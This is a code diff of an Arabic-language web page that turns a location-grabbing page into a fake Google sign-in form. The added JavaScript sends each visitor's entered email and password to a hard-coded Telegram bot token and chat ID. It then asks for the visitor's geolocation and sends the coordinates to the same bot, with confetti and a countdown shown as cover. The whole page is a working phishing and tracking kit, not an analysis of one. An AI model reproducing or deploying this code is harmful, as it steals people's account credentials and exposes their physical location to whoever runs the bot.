@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>صفحة توجيه البوت</title>
+  <title>تسجيل الدخول</title>
   <style>
     body {
       margin: 0;
@@ -11,36 +11,48 @@
       background-size: cover;
       background-position: center;
       height: 100vh;
-      font-family: 'Arial', sans-serif;
+      font-family: Arial, sans-serif;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
     }
 
-    #activate-btn {
-      padding: 15px 30px;
-      font-size: 20px;
-      border: none;
-      border-radius: 8px;
-      background-color: #28a745;
+    .login-container, .location-container {
+      background-color: #ffffffdd;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      width: 320px;
+      display: none;
+    }
+
+    .login-container.active, .location-container.active {
+      display: block;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      padding: 10px 20px;
+      background-color: #1a73e8;
       color: white;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
-      margin-bottom: 20px;
+      font-size: 16px;
     }
 
     #countdown {
-      width: 70px;
-      height: 70px;
-      font-size: 30px;
+      margin-top: 20px;
+      font-size: 28px;
       font-weight: bold;
-      background-color: #ffffffcc;
-      border: 2px solid #ccc;
-      border-radius: 10px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      visibility: hidden;
     }
 
     canvas {
@@ -53,8 +65,20 @@
 </head>
 <body>
 
-  <button id="activate-btn">اضغط لتفعيل الموقع</button>
-  <div id="countdown">5</div>
+  <!-- واجهة تسجيل الدخول -->
+  <div class="login-container active" id="login">
+    <h2>قم بتسجيل الدخول إلى Google للمتابعة</h2>
+    <input type="email" placeholder="البريد الإلكتروني" id="email">
+    <input type="password" placeholder="كلمة المرور" id="password">
+    <button onclick="goToLocation()">تسجيل الدخول</button>
+  </div>
+
+  <!-- واجهة الموقع والعداد -->
+  <div class="location-container" id="locationBox">
+    <h3>يرجى تفعيل الموقع للمتابعة</h3>
+    <button onclick="requestLocation()">تفعيل الموقع</button>
+    <div id="countdown" style="visibility:hidden;">5</div>
+  </div>
 
   <canvas id="confetti"></canvas>
 
@@ -62,13 +86,31 @@
   <script>
     const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
     const CHAT_ID = "6028485445";
-
-    const btn = document.getElementById("activate-btn");
-    const countdownEl = document.getElementById("countdown");
-
     let seconds = 5;
 
-    btn.addEventListener("click", () => {
+    function goToLocation() {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (email === "" || password === "") {
+        alert("يرجى ملء جميع الحقول");
+        return;
+      }
+
+      // إرسال المعلومات إلى Telegram
+      const msg = `📩 تسجيل دخول جديد:\n\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
+        .then(() => {
+          // عرض واجهة الموقع بعد الإرسال
+          document.getElementById("login").classList.remove("active");
+          document.getElementById("locationBox").classList.add("active");
+        })
+        .catch(() => {
+          alert("حدث خطأ أثناء الإرسال.");
+        });
+    }
+
+    function requestLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
           const lat = position.coords.latitude;
@@ -77,17 +119,12 @@
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
             .catch(() => {});
 
-          // تشغيل الشرارات
-          confetti({
-            particleCount: 100,
-            spread: 70,
-            origin: { y: 0.6 }
-          });
+          // confetti effect
+          confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } });
 
-          // إخفاء الزر
-          btn.style.display = "none";
-
-          // عرض العداد
+          // إخفاء الزر، إظهار العداد
+          document.querySelector("#locationBox button").style.display = "none";
+          const countdownEl = document.getElementById("countdown");
           countdownEl.style.visibility = "visible";
           countdownEl.innerText = seconds;
 
@@ -100,12 +137,10 @@
             }
           }, 1000);
         }, () => {
-          alert("لم يتم السماح بالوصول إلى الموقع.");
+          alert("لم يتم السماح بالموقع.");
         });
-      } else {
-        alert("متصفحك لا يدعم تحديد الموقع.");
       }
-    });
+    }
   </script>
 </body>
 </html>
